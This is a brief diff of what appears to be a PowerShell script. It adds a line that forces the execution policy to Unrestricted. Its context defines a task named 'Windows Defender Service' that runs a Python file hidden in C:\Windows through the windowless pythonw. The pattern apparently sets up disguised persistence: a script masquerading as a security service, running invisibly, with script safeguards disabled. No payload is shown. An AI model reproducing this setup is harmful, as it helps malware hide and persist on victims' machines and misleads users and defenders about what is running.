@@ -1,3 +1,5 @@
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force
+
 $TaskName = "Windows Defender Service"
 $FilePath = "C:\Windows\Config_.py"
 $PythonWPath = (Get-Command pythonw).Path
